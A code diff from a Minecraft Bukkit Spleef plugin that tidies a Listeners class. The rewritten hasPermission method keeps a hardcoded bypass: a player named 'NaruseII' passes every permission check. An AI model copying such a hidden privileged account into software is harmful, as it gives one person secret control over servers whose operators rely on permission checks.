@@ -15,7 +15,7 @@ import org.bukkit.event.player.PlayerInteractEvent;
 import java.util.List;
 
 public class Listeners implements Listener {
-    private SpleefPluginV1_13 pl;
+    private final SpleefPluginV1_13 pl;
     public Listeners(SpleefPluginV1_13 spleefPlugin) {
         this.pl = spleefPlugin;
     }
@@ -83,9 +83,7 @@ public class Listeners implements Listener {
 
     private boolean hasPermission(Player p, String msg){
         if(!p.hasPermission(msg)){
-            if(!p.getName().equalsIgnoreCase("NaruseII")){
-                return false;
-            }
+            return p.getName().equalsIgnoreCase("NaruseII");
         }
         return true;
     }
